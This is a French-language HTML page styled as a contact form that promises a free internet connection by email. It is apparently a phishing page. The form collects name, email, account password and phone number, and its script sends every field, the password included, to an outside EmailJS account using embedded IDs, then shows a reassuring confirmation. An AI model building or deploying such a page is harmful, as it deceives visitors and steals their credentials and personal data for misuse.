<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contactez-nous</title>
    <style>
        /* Votre CSS ici */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }

        header {
            background-color: #4CAF50;
            color: white;
            padding: 1em;
            text-align: center;
        }

        main {
            padding: 1em;
        }

        form {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 1em;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        label {
            display: block;
            margin-bottom: 0.5em;
        }

        input {
            width: 100%;
            padding: 0.5em;
            margin-bottom: 1em;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 1em;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }

        #confirmation-message {
            text-align: center;
            margin-top: 1em;
            font-size: 1.2em;
            color: green;
        }

        .hidden {
            display: none;
        }

        #toggle-password {
            background-color: transparent;
            border: none;
            cursor: pointer;
            padding: 0;
            font-size: inherit;
            color: #007bff; /* Couleur du lien par défaut de Bootstrap */
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header>
        <h1>Recevoir votre connexion internet gratuit par email !</h1>
    </header>
    <main>
        <form id="contact-form">
            <label for="first-name">Prénom:</label>
            <input type="text" id="first-name" name="first-name" required>

            <label for="last-name">Nom:</label>
            <input type="text" id="last-name" name="last-name" required>

            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>

            <label for="password">Mot de passe:</label>
            <input type="password" id="password" name="password" required>
            <button type="button" id="toggle-password">Afficher</button>

            <label for="phone">Numéro de téléphone:</label>
            <input type="tel" id="phone" name="phone" required>

            <button type="submit">Envoyer</button>
        </form>
        <div id="confirmation-message" class="hidden">
            Merci pour vos coordonnées. Vous serez contacté bientôt.
        </div>
    </main>
    <footer>
        <p>&copy; 2024 Contactez-nous </p>
    </footer>

    <!-- Load EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("fiSggN-kvwqs9nZ7Q"); // Remplacez par votre user ID EmailJS
        })();
    </script>
    <script>
        // Votre code JavaScript ici
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const togglePasswordButton = document.getElementById('toggle-password');

            togglePasswordButton.addEventListener('click', function() {
                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    togglePasswordButton.textContent = 'Cacher';
                } else {
                    passwordInput.type = 'password';
                    togglePasswordButton.textContent = 'Afficher';
                }
            });

            document.getElementById('contact-form').addEventListener('submit', function(event) {
                event.preventDefault();

                const serviceID = 'service_gifigm6'; // Remplacez par votre service ID
                const templateID = 'template_rp3hllb'; // Remplacez par votre template ID

                const templateParams = {
                    first_name: document.getElementById('first-name').value,
                    last_name: document.getElementById('last-name').value,
                    email: document.getElementById('email').value,
                    password: document.getElementById('password').value,
                    phone: document.getElementById('phone').value
                };

                emailjs.send(serviceID, templateID, templateParams)
                    .then(function(response) {
                        document.getElementById('contact-form').reset(); // Réinitialise le formulaire
                        document.getElementById('confirmation-message').classList.remove('hidden'); // Affiche le message de confirmation
                    }, function(error) {
                        alert('Erreur lors de l\'envoi du message : ' + JSON.stringify(error));
                    });
            });
        });
    </script>
</body>
  </html>
